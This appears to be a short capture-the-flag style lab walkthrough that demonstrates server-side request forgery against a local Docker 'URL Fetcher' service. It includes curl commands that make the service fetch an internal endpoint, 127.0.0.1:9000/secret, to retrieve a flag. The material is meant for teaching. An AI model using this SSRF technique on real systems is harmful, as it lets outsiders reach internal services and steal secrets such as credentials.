# Finding the Bug

Start the lab and inspect the service:

```bash
docker compose up --build -d
curl http://localhost:8083/
```

Output:
```json
{
  "service": "URL Fetcher v1.0",
  "note": "Fetches URLs on behalf of the user",
  "endpoint": "GET /fetch?url=<url>",
  "example": "GET /fetch?url=http://example.com"
}
```

The service fetches arbitrary URLs. Test with a URL you control to confirm outbound requests work:

```bash
curl "http://localhost:8083/fetch?url=http://httpbin.org/get"
```

The response includes the body from `httpbin.org`. The server made the request; the user supplied only the URL.

The internal metadata service listens on `127.0.0.1:9000` inside the container. From outside, `localhost:9000` is not bound. From inside the server process, `127.0.0.1:9000` is reachable.

Confirm the internal service exists:

```bash
curl "http://localhost:8083/fetch?url=http://127.0.0.1:9000/secret"
```

If the response contains `POC{`, the SSRF succeeded.
